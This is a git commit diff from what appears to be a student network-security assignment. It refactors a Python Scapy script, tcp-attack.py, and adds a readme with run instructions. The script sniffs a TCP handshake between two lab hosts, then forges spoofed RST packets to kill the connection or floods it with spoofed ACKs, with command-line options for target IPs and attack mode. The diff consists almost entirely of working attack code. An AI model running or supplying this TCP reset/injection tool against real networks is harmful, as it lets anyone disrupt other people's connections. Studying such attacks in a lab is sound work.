d5678ffe13603780dc1dcf333e1860d23277f4db
mlRosenquist <lyngrosenquistmorten@gmal.com>
2021-10-18 16:18:29 +0200

    Clean up

---
+++ assignment-2/throttling-tcp-connections/readme.md
@@ -0,0 +1,5 @@
+# How to run? 
+
+1. Create python venv
+2. Install requirements.txt dependencies 
+3. Execute tcp-attack.py: ´py tcp-attack.py -h -> python3 tcp-attack.py --d 10.0.2.4 --s 10.0.2.5 --m rst-attack'
--- assignment-2/throttling-tcp-connections/tcp-attack.py
+++ assignment-2/throttling-tcp-connections/tcp-attack.py
@@ -1,23 +1,25 @@
 #!/usr/bin/env python
+import argparse
+import getopt
+import sys
+
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 
-srcip = "10.0.2.5"
-dstip = "10.0.2.4"
-mode = "ack-attack"
-def send_rst_pkts(dst_port, src_port, pkt):
+def send_rst_pkts(dstip, srcip, dst_port, src_port, pkt):
     print("Sending rst pkts")
 
     ip1 = IP(src=dstip, dst=srcip)
     TCP_RST1 = TCP(sport=int(dst_port), dport=int(src_port), flags="R", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
+    send(ip1 / TCP_RST1, verbose=False)
 
     ip2 = IP(src=srcip, dst=dstip)
     TCP_RST2 = TCP(sport=int(src_port), dport=int(dst_port), flags="R", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
+    send(ip2 / TCP_RST2, verbose=False)
+#
 
-    send(ip1 / TCP_RST1)
-    send(ip2 / TCP_RST2)
 
-def send_ack_pkts(dst_port, src_port, pkt):
+def send_ack_pkts(dstip, srcip, dst_port, src_port, pkt):
 
     ip1 = IP(src=dstip, dst=srcip)
     TCP_ACK1 = TCP(sport=int(dst_port), dport=int(src_port), flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
@@ -25,10 +27,12 @@ def send_ack_pkts(dst_port, src_port, pkt):
     ip2 = IP(src=srcip, dst=dstip)
     TCP_ACK2 = TCP(sport=int(src_port), dport=int(dst_port), flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
 
-    send(ip1 / TCP_ACK1, count=3)
-    #send(ip2 / TCP_ACK2, count=3)
+    send(ip1 / TCP_ACK1, count=3, verbose=False)
+    send(ip2 / TCP_ACK2, count=3, verbose=False)
+#
 
-def launch_attack(dst_port: str, src_port: str):
+
+def launch_attack(dstip, srcip, dst_port: str, src_port: str, mode):
     ack_filter = 'src ' + dstip + ' and ' \
                  'dst ' + srcip + ' and ' \
                  'src port ' + dst_port + ' and ' \
@@ -36,22 +40,57 @@ def launch_attack(dst_port: str, src_port: str):
                  'tcp[13] & 16!=0'
 
     if(mode == "rst-attack"):
-        t = sniff(filter=ack_filter, prn=lambda pkt: send_rst_pkts(dst_port=dst_port, src_port=src_port, pkt=pkt))
+        print("Dropping connection")
+        t = sniff(filter=ack_filter, prn=lambda pkt: send_rst_pkts(dstip=dstip, srcip=srcip, dst_port=dst_port, src_port=src_port, pkt=pkt))
     elif(mode == "ack-attack"):
-        t = sniff(filter=ack_filter, prn=lambda pkt: send_ack_pkts(dst_port=dst_port, src_port=src_port, pkt=pkt))
+        print("ACK Flooding")
+        t = sniff(filter=ack_filter, prn=lambda pkt: send_ack_pkts(dstip=dstip, srcip=srcip, dst_port=dst_port, src_port=src_port, pkt=pkt))
+#
 
-def syn_pkt_received(pkt):
+
+def syn_pkt_received(dstip, srcip, mode, pkt):
     dst_port = pkt[TCP].sport
     src_port = pkt[TCP].dport
-    launch_attack(str(dst_port), str(src_port))
+    launch_attack(dstip, srcip, str(dst_port), str(src_port), mode)
+#
 
 
-if __name__ == '__main__':
+def main(argv):
+    dstip = ''
+    srcip = ''
+    mode = ''
+
+    parser = argparse.ArgumentParser(description='Execute TCP attack')
+    parser.add_argument('--d',
+                        metavar='d',
+                        type=str,
+                        required=True,
+                        help="Destination IP")
+
+    parser.add_argument('--s',
+                        metavar='s',
+                        type=str,
+                        required=True,
+                        help="Source IP")
+
+    parser.add_argument('--m',
+                        metavar='m',
+                        type=str,
+                        required=True,
+                        help="Attack mode: rst-attack or ack-attack")
+
+    args = parser.parse_args()
+    dstip = args.d
+    srcip = args.s
+    mode = args.m
+
+    print('dstip is ' + dstip)
+    print('srcip is ' + srcip)
+    print('mode is ' + mode)
     print("Awaiting SYN packet")
     syn_filter = 'ip and src ' + dstip + ' and dst ' + srcip + ' and tcp[13] & 2!=0'
-    sniff(count=1, filter=syn_filter, prn=syn_pkt_received)
+    sniff(count=1, filter=syn_filter, prn=lambda pkt: syn_pkt_received(dstip, srcip, mode, pkt))
+#
 
-    while(True):
-        x = 1;
-# scp 20mbfile.txt mlr@10.0.2.4:/home/mlr/files/text.txt
-# ssh -p 22 mlr@10.0.2.4
+if __name__ == "__main__":
+    main(sys.argv[1:])
